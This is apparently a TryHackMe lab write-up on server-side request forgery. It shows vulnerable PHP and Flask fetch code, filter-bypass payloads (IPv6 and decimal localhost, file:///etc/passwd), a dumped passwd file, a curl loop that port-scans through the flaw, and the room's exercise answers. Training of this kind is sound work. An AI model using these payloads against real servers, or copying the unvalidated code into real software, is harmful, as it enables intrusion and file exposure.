# SSRF

This room aims at providing the basic introduction to Server Side request forgery vulnerability(SSRF).

[SSRF](https://tryhackme.com/room/ssrf)

## Topic's

- Server Side request forgery (SSRF)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 What is SSRF?

**Overview**

This room will focus on giving you a detailed understanding of what a server-side forgery request -- better known as SSRF-- vulnerability is, as well as how you can discover whether any website is vulnerable to any form of SSRF, and how an attacker can leverage SSRF to their own advantage.

**What is SSRF?**

In simpler terms, SSRF is a vulnerability in web applications whereby an attacker can make further HTTP requests through the server. An attacker can make use of this vulnerability to communicate with any internal services on the server's network which are generally protected by firewalls.

![](https://i.imgur.com/cAozwRZ.png)

Now if you focus on the above diagram, In a normal case the attacker would only be able to visit the website and see the website data. The server running the website is allowed to communicate to the internal GitLab or Postgres database, but the user may not, because the firewall in the middle only allows access to ports 80 (HTTP) and 443 (HTTPS).However, SSRF would give an attacker the power to make a connection to Postgres and see its data by first connecting to the website server, and then using that to connect to the database. Postgres would think that the website is requesting something from the database, but in reality, it's the attacker making use of an SSRF vulnerability in website to get the data. The process would usually be something like this: an attacker finds an SSRF vulnerability on a website. The firewall allows all requests to the website. The attacker then exploits the SSRF vulnerability by forcing the webserver to request data from the database, which it then returns to the attacker. Because the request is coming from the webserver, rather than directly from the attacker, the firewall allows this to pass.

In the next task, we'll see the kind of payloads which are used for exploiting SSRF.

1. Deploy the VM

`No answer needed`

## Task 2 Cause of the Vulnerability

In task 1 we understood what SSRF is, so now we'll look at what causes an SSRF vulnerability. What are the mistakes made by developers that make a website/application vulnerable to SSRF?

**Cause of the vulnerability**

The main cause of the vulnerability is (as it often is) blindly trusting input from a user. In the case of an SSRF vulnerability, a user would be asked to input a URL (or maybe an IP address). The web application would use that to make a request. SSRF comes about when the input hasn't been properly checked or filtered.

Let's look at some vulnerable code:

**Example 1: PHP**

Assume there is an application that takes the URL for an image, which the web page then displays for you. The vulnerable SSRF code would look like this:

```php
<?php
if (isset($_GET['url']))

{
  $url = $_GET['url'];
  $image = fopen($url, 'rb');
  header("Content-Type: image/png");
  fpassthru($image);

}
```

This is simple PHP code which checks if there is information sent in a 'url' parameter then, without performing any kind of check on it, the code simply makes a request to the user-submitted URL. Attackers essentially have full control of the URL and can make arbitrary GET requests to any website on the Internet through the server -- as well as accessing resources on the server itself.

**Example 2: Python**

```py
from flask import Flask, request,  render_template, redirect
import requests


app = Flask(__name__)


@app.route("/")
def start():
    url = request.args.get("id")
    r = requests.head(url, timeout=2.000)
    return render_template("index.html", result = r.content)

if __name__ == "__main__":
      app.run(host = '0.0.0.0')
```

The above example shows a very small flask application which does the same thing:

1. It takes the value of the "url" parameter.
2. Then it makes a request to the given URL and shows the content of that URL to the user.

Again we see that there is no sanitisation or any kind of check performed on the user input. This is why you should always try as many different payloads as you can when testing an application.

Speaking of payloads, in the next task, we'll see what kind of payloads are used in SSRF.

1. Read the above.

`No answer needed`

## Task 3 SSRF Payload

Now we are going to learn what kind of payloads are used to exploit an SSRF vulnerability. To understand this we are going to use a live demonstration. Connect to `http://MACHINE_IP:5000`

The page gives us the option to enter a url, which it will fetch for us.

**Basic Payloads**

Let's start with the basic payload. This payload might give you the hint that there is an SSRF vulnerability, and give you a hint as to which payloads which you should try next.

Initially, start by searching for the localhost IP (127.0.0.1) with any port to see if the port is running a service. Say you wanted to check if the server has a hidden database, you might search for http://127.0.0.1:3306, 3306 is the port for MySQL DB so if there is a database running, you will likely get a positive response.

If we try this payload on our VM we will see the following output:

![](https://i.imgur.com/gMq0LQ4.png)

This shows that the port 3306 is open.

In a similar manner, we could also have used "localhost" or "0.0.0.0" in place of 127.0.0.1

**Advanced payloads**

Now it's very possible that some sort of sanitization will be being applied to the input, so the system might detect strings like "localhost" or "127.0.0.1" and stop the request. That said, it's possible to try and bypass those kinds of restrictions.

The very first way is to try the IPv6 version of the localhost i.e [::]. So the payload from before would look like this `http://[::]:3306`.

The basic page we've already worked with doesn't have any filter, so to try these advanced payloads head to `http://MACHINE_IP:5000/advanced`. The page is very similar to the previous one but, you'll notice that if you try the basic payload it detects it as "Malicious code".

Try it for yourself: try to enter the old payloads such as "`http://127.0.0.1:3306`" or `http://localhost:3306` -- you'll get something like:

![](https://i.imgur.com/ST8xWvm.png)

As expected, this is because there are SSRF checks in place, but still it's possible to bypass them. It's also possible that if you try to access `http://[::]:3306`, you might get "target not reachable". When this happens it can be the result of how the framework is handling input in the application. If it was a PHP application then this would work, but flask/Django might interpret these payloads differently. If you fail with that payload, try removing the brackets (i.e try `http://:::3306`): remember that the third colon indicates the separation between port and IP.

So if we enter: `http://:::3306` we see something like:

![](https://i.imgur.com/1rX91kC.png)

It is possible that the IPv6 payload may also be detected. In that case what we usually do is to encode our IP: either into a decimal format or a hexadecimal format.

The IP "`127.0.0.1`" can be replaced with its Decimal and Hexadecimal counterparts to bypass the restrictions. The decimal version of the localhost IP would be "2130706433" and the Hexadecimal version would be "0x7f000001".

**Note** - There is a script to do this conversion process, you can find it [here](https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72)

**Reading files**

Port scanning isn't the only thing that we do with SSRF -- we can also read files from the server, but only if we use the proper schema (i.e for a HTTP request we would start the URL with "http://" -- in a similar manner if we start the URL with "file://" it would then try to read the files from the server itself).

So, for example, a simple SSRF file reading payload would be `file:///etc/passwd`, to read the /etc/passwd file on a Linux machine.

To see this happen for yourself, go to `http://MACHINE_IP:5000/filessrf`, you'll get another very similar form as with the advanced and basic SSRF tutorials -- but one difference that you'll notice is that you can enter "file://" in this one.

So if now we try to read the file we'll be able to see the contents:

![](https://i.imgur.com/edRQpNn.png)

Remember is that it's unlikely that we'll be able to read files from any higher privileged user such as "root".

![](https://i.imgur.com/2ZaFrGm.png)

There are a lot of other types of payload that can be used (such as URL encoding, double URL encoding, using schemes like dict, etc). You can see some of these payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file)

1. Read the above.

`No answer needed`

## Task 4 Exercise

Until now we have been looking at what SSRF is and how it works. Now its time for you to try it yourself. I would recommend trying this by yourself, before looking at the next task for the explanation.

For the exercise go to `http://MACHINE_IP:8000`.

**Exercise**: Your task would be to tell how many ports are open on the machine including all the ones that are accessible from outside and as well as the one only accessible from inside. Your answer would also include the port 8000.
**The solution for this task will be given in the next task if you would like to confirm your answer, or are struggling to complete the task.**

I am providing some hints, but again try to spend some time on it by yourself before looking.

1. Hint 1

`No answer needed`

2. Hint 2

`No answer needed`

3. Hint 3

`No answer needed`

4. Hint 4

`No answer needed`

5. Hint 5

`No answer needed`

6. Hint 6

`No answer needed`

7. Hint 7

`No answer needed`

8. How many ports are open?

`5`

9.  How many users are there on the system?

[view-source:http://10.10.33.98:8000/attack?url=file%3A%2F%2F%2Fetc%2Fpasswd](view-source:http://10.10.33.98:8000/attack?url=file%3A%2F%2F%2Fetc%2Fpasswd)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
feast:x:1001:1001:,,,:/home/feast:/bin/bash
falconfeast:x:1002:1002:,,,:/home/falconfeast:/bin/bash
```

falcon
feast
falconfeast

`3`

## Task 5 Solution

I hope you've tried the exercise before looking at the solution.

**Explanation**

When we visit the port 8000 we see a simple input field. Now if you try all the basic payloads you'll get the malicious code error.

If you try the IPv6 format you would get a similar error.

![](https://i.imgur.com/X2jY3mP.png)

At this point, it looks like the system might not be vulnerable to SSRF at all; but before we give up, we should try using the decimal/hexadecimal conversion method.

We will use the script (i.e ip2dh.py) to convert the IP 127.0.0.1 to decimal which would give us, 2130706433. Now if you want you can use this IP and port 3306 to test if it works or not.

![](https://i.imgur.com/E6W4V7S.png)

That being said we can't check every port by ourselves. Instead we will make a small bash script which will do the work for us.

**Note**: If you are not interested in writing a bash script then you could instead use Burpsuite's Intruder module, but in this explanation, I am going to show you how to use bash for smaller tasks like these.

```sh
for x in {1..65535};
    do cmd=$(curl -so /dev/null http://10.10.33.98:8000/attack?url=http://2130706433:${x} \
        -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done
```

The main thing to understand here is the curl command. If you were to run this curl command by itself with a port like 3306, it would give you the size in bytes of the response, which, for a valid response, in this case is 1042. However, if we run it with some random port, say 54321, it would show a return size of 1046 bytes, as the response from the website will be slightly different. This means that for ports that are not reachable we get size 1045 and for a port that is open we get size 1042. On that basis, we are able to write a script to scan every port and tell us when the size is not 1045 bytes. This script will tell you that 5 ports (22, 3306, 5000, 8000, 6783) are open.

In terms of the file reading question, you can just use the default “file://” schema to read files from the system.

1. Read the above.

`No answer needed`
